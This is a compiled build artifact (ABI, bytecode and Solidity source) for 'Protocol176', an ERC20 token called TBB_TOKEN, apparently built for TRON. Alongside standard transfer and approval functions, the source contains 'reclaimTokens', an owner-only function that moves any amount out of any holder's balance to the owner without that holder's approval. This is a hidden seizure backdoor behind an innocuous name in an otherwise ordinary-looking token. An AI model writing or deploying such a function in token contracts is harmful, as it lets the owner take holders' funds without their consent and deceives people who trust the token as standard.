{
  "contractName": "Protocol176",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "initialOwner",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "allowance",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "needed",
          "type": "uint256"
        }
      ],
      "name": "ERC20InsufficientAllowance",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "needed",
          "type": "uint256"
        }
      ],
      "name": "ERC20InsufficientBalance",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "approver",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidApprover",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "receiver",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidReceiver",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidSender",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidSpender",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "name": "OwnableInvalidOwner",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "OwnableUnauthorizedAccount",
      "type": "error"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "reclaimTokens",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801562000010575f80fd5b50d380156200001d575f80fd5b50d280156200002a575f80fd5b5060405162001f1f38038062001f1f833981810160405281019062000050919062000643565b806040518060400160405280600981526020017f5442425f544f4b454e00000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f54424200000000000000000000000000000000000000000000000000000000008152508160039081620000ce9190620008d7565b508060049081620000e09190620008d7565b5050505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff160362000156575f6040517f1e4fbdf70000000000000000000000000000000000000000000000000000000081526004016200014d9190620009cc565b60405180910390fd5b6200016781620001af60201b60201c565b50620001a8306200017d6200027260201b60201c565b600a6200018b919062000b70565b636ab13b806200019c919062000bc0565b6200027a60201b60201c565b5062000d29565b5f60055f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508160055f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b5f6012905090565b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603620002ed575f6040517fec442f05000000000000000000000000000000000000000000000000000000008152600401620002e49190620009cc565b60405180910390fd5b620003005f83836200030460201b60201c565b5050565b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff160362000375576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016200036c9062000c68565b60405180910390fd5b620003888383836200038d60201b60201c565b505050565b5f73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603620003e1578060025f828254620003d4919062000c88565b92505081905550620004b2565b5f805f8573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f20549050818110156200046d578381836040517fe450d38c000000000000000000000000000000000000000000000000000000008152600401620004649392919062000cd3565b60405180910390fd5b8181035f808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f2081905550505b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603620004fb578060025f828254039250508190555062000545565b805f808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f82825401925050819055505b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051620005a4919062000d0e565b60405180910390a3505050565b5f80fd5b5f74ffffffffffffffffffffffffffffffffffffffffff82169050919050565b620005e081620005b5565b8114620005eb575f80fd5b50565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6200061982620005ee565b9050919050565b5f815190506200063081620005d5565b6200063b816200060d565b905092915050565b5f602082840312156200065b576200065a620005b1565b5b5f6200066a8482850162000620565b91505092915050565b5f81519050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602260045260245ffd5b5f6002820490506001821680620006ef57607f821691505b602082108103620007055762000704620006aa565b5b50919050565b5f819050815f5260205f209050919050565b5f6020601f8301049050919050565b5f82821b905092915050565b5f60088302620007697fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff826200072c565b6200077586836200072c565b95508019841693508086168417925050509392505050565b5f819050919050565b5f819050919050565b5f620007bf620007b9620007b3846200078d565b62000796565b6200078d565b9050919050565b5f819050919050565b620007da836200079f565b620007f2620007e982620007c6565b84845462000738565b825550505050565b5f90565b62000808620007fa565b62000815818484620007cf565b505050565b5b818110156200083c57620008305f82620007fe565b6001810190506200081b565b5050565b601f8211156200088b5762000855816200070b565b62000860846200071d565b8101602085101562000870578190505b620008886200087f856200071d565b8301826200081a565b50505b505050565b5f82821c905092915050565b5f620008ad5f198460080262000890565b1980831691505092915050565b5f620008c783836200089c565b9150826002028217905092915050565b620008e28262000673565b67ffffffffffffffff811115620008fe57620008fd6200067d565b5b6200090a8254620006d7565b6200091782828562000840565b5f60209050601f8311600181146200094d575f841562000938578287015190505b620009448582620008ba565b865550620009b3565b601f1984166200095d866200070b565b5f5b8281101562000986578489015182556001820191506020850194506020810190506200095f565b86831015620009a65784890151620009a2601f8916826200089c565b8355505b6001600288020188555050505b505050505050565b620009c6816200060d565b82525050565b5f602082019050620009e15f830184620009bb565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f8160011c9050919050565b5f808291508390505b600185111562000a715780860481111562000a495762000a48620009e7565b5b600185161562000a595780820291505b808102905062000a698562000a14565b945062000a29565b94509492505050565b5f8262000a8b576001905062000b5d565b8162000a9a575f905062000b5d565b816001811462000ab3576002811462000abe5762000af4565b600191505062000b5d565b60ff84111562000ad35762000ad2620009e7565b5b8360020a91508482111562000aed5762000aec620009e7565b5b5062000b5d565b5060208310610133831016604e8410600b841016171562000b2e5782820a90508381111562000b285762000b27620009e7565b5b62000b5d565b62000b3d848484600162000a20565b9250905081840481111562000b575762000b56620009e7565b5b81810290505b9392505050565b5f60ff82169050919050565b5f62000b7c826200078d565b915062000b898362000b64565b925062000bb87fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff848462000a7a565b905092915050565b5f62000bcc826200078d565b915062000bd9836200078d565b925082820262000be9816200078d565b9150828204841483151762000c035762000c02620009e7565b5b5092915050565b5f82825260208201905092915050565b7f4275726e696e6720746f6b656e73206973206e6f7420616c6c6f7765640000005f82015250565b5f62000c50601d8362000c0a565b915062000c5d8262000c1a565b602082019050919050565b5f6020820190508181035f83015262000c818162000c42565b9050919050565b5f62000c94826200078d565b915062000ca1836200078d565b925082820190508082111562000cbc5762000cbb620009e7565b5b92915050565b62000ccd816200078d565b82525050565b5f60608201905062000ce85f830186620009bb565b62000cf7602083018562000cc2565b62000d06604083018462000cc2565b949350505050565b5f60208201905062000d235f83018462000cc2565b92915050565b6111e88062000d375f395ff3fe608060405234801561000f575f80fd5b50d3801561001b575f80fd5b50d28015610027575f80fd5b50600436106100e5575f3560e01c8063715018a6116100a2578063a9059cbb1161007c578063a9059cbb14610219578063dd62ed3e14610249578063f2fde38b14610279578063f87549d114610295576100e5565b8063715018a6146101d35780638da5cb5b146101dd57806395d89b41146101fb576100e5565b806306fdde03146100e9578063095ea7b31461010757806318160ddd1461013757806323b872dd14610155578063313ce5671461018557806370a08231146101a3575b5f80fd5b6100f16102b1565b6040516100fe9190610dce565b60405180910390f35b610121600480360381019061011c9190610eaa565b610341565b60405161012e9190610f02565b60405180910390f35b61013f610363565b60405161014c9190610f2a565b60405180910390f35b61016f600480360381019061016a9190610f43565b61036c565b60405161017c9190610f02565b60405180910390f35b61018d61039a565b60405161019a9190610fae565b60405180910390f35b6101bd60048036038101906101b89190610fc7565b6103a2565b6040516101ca9190610f2a565b60405180910390f35b6101db6103e7565b005b6101e56103fa565b6040516101f29190611001565b60405180910390f35b610203610422565b6040516102109190610dce565b60405180910390f35b610233600480360381019061022e9190610eaa565b6104b2565b6040516102409190610f02565b60405180910390f35b610263600480360381019061025e919061101a565b6104d4565b6040516102709190610f2a565b60405180910390f35b610293600480360381019061028e9190610fc7565b610556565b005b6102af60048036038101906102aa9190610eaa565b6105da565b005b6060600380546102c090611085565b80601f01602080910402602001604051908101604052809291908181526020018280546102ec90611085565b80156103375780601f1061030e57610100808354040283529160200191610337565b820191905f5260205f20905b81548152906001019060200180831161031a57829003601f168201915b5050505050905090565b5f8061034b6105f8565b90506103588185856105ff565b600191505092915050565b5f600254905090565b5f806103766105f8565b9050610383858285610611565b61038e8585856106a4565b60019150509392505050565b5f6012905090565b5f805f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f20549050919050565b6103ef610794565b6103f85f61081b565b565b5f60055f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60606004805461043190611085565b80601f016020809104026020016040519081016040528092919081815260200182805461045d90611085565b80156104a85780601f1061047f576101008083540402835291602001916104a8565b820191905f5260205f20905b81548152906001019060200180831161048b57829003601f168201915b5050505050905090565b5f806104bc6105f8565b90506104c98185856106a4565b600191505092915050565b5f60015f8473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f2054905092915050565b61055e610794565b5f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036105ce575f6040517f1e4fbdf70000000000000000000000000000000000000000000000000000000081526004016105c59190611001565b60405180910390fd5b6105d78161081b565b50565b6105e2610794565b6105f4826105ee6103fa565b836106a4565b5050565b5f33905090565b61060c83838360016108de565b505050565b5f61061c84846104d4565b90507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff81101561069e578181101561068f578281836040517ffb8f41b2000000000000000000000000000000000000000000000000000000008152600401610686939291906110b5565b60405180910390fd5b61069d84848484035f6108de565b5b50505050565b5f73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610714575f6040517f96c6fd1e00000000000000000000000000000000000000000000000000000000815260040161070b9190611001565b60405180910390fd5b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610784575f6040517fec442f0500000000000000000000000000000000000000000000000000000000815260040161077b9190611001565b60405180910390fd5b61078f838383610aad565b505050565b61079c6105f8565b73ffffffffffffffffffffffffffffffffffffffff166107ba6103fa565b73ffffffffffffffffffffffffffffffffffffffff1614610819576107dd6105f8565b6040517f118cdaa70000000000000000000000000000000000000000000000000000000081526004016108109190611001565b60405180910390fd5b565b5f60055f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508160055f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b5f73ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff160361094e575f6040517fe602df050000000000000000000000000000000000000000000000000000000081526004016109459190611001565b60405180910390fd5b5f73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16036109be575f6040517f94280d620000000000000000000000000000000000000000000000000000000081526004016109b59190611001565b60405180910390fd5b8160015f8673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f8573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f20819055508015610aa7578273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92584604051610a9e9190610f2a565b60405180910390a35b50505050565b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610b1b576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b1290611134565b60405180910390fd5b610b26838383610b2b565b505050565b5f73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610b7b578060025f828254610b6f919061117f565b92505081905550610c49565b5f805f8573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f2054905081811015610c04578381836040517fe450d38c000000000000000000000000000000000000000000000000000000008152600401610bfb939291906110b5565b60405180910390fd5b8181035f808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f2081905550505b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610c90578060025f8282540392505081905550610cda565b805f808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f82825401925050819055505b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051610d379190610f2a565b60405180910390a3505050565b5f81519050919050565b5f82825260208201905092915050565b5f5b83811015610d7b578082015181840152602081019050610d60565b5f8484015250505050565b5f601f19601f8301169050919050565b5f610da082610d44565b610daa8185610d4e565b9350610dba818560208601610d5e565b610dc381610d86565b840191505092915050565b5f6020820190508181035f830152610de68184610d96565b905092915050565b5f80fd5b5f74ffffffffffffffffffffffffffffffffffffffffff82169050919050565b610e1b81610df2565b8114610e25575f80fd5b50565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610e5182610e28565b9050919050565b5f81359050610e6681610e12565b610e6f81610e47565b905092915050565b5f819050919050565b610e8981610e77565b8114610e93575f80fd5b50565b5f81359050610ea481610e80565b92915050565b5f8060408385031215610ec057610ebf610dee565b5b5f610ecd85828601610e58565b9250506020610ede85828601610e96565b9150509250929050565b5f8115159050919050565b610efc81610ee8565b82525050565b5f602082019050610f155f830184610ef3565b92915050565b610f2481610e77565b82525050565b5f602082019050610f3d5f830184610f1b565b92915050565b5f805f60608486031215610f5a57610f59610dee565b5b5f610f6786828701610e58565b9350506020610f7886828701610e58565b9250506040610f8986828701610e96565b9150509250925092565b5f60ff82169050919050565b610fa881610f93565b82525050565b5f602082019050610fc15f830184610f9f565b92915050565b5f60208284031215610fdc57610fdb610dee565b5b5f610fe984828501610e58565b91505092915050565b610ffb81610e47565b82525050565b5f6020820190506110145f830184610ff2565b92915050565b5f80604083850312156110305761102f610dee565b5b5f61103d85828601610e58565b925050602061104e85828601610e58565b9150509250929050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602260045260245ffd5b5f600282049050600182168061109c57607f821691505b6020821081036110af576110ae611058565b5b50919050565b5f6060820190506110c85f830186610ff2565b6110d56020830185610f1b565b6110e26040830184610f1b565b949350505050565b7f4275726e696e6720746f6b656e73206973206e6f7420616c6c6f7765640000005f82015250565b5f61111e601d83610d4e565b9150611129826110ea565b602082019050919050565b5f6020820190508181035f83015261114b81611112565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61118982610e77565b915061119483610e77565b92508282019050808211156111ac576111ab611152565b5b9291505056fea26474726f6e58221220d0d34c33f432a4e86a99ae78a1eacb553d11580265dca573cf21a15d53b96c6e64736f6c63430008140033",
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract Protocol176 is ERC20, Ownable {\n    constructor(address initialOwner)\n        ERC20(\"TBB_TOKEN\", \"TBB\")\n        Ownable(initialOwner)\n    {\n        _mint(address(this), 1790000000 * 10 ** decimals());\n    }\n\n    function reclaimTokens(address from, uint256 amount) public onlyOwner {\n        _transfer(from, owner(), amount);\n    }\n\n    /**\n     * @dev Overrides the default _update function to prevent burning tokens.\n     * This is the corrected and simplified implementation.\n     */\n    function _update(address from, address to, uint256 value)\n        internal\n        override\n    {\n        require(to != address(0), \"Burning tokens is not allowed\");\n        super._update(from, to, value);\n    }\n}\n",
  "sourcePath": "/home/user/Identity_Node/contracts/Protocol176.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.20+commit.5f1834bc.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2026-03-06T05:35:55.357Z"
}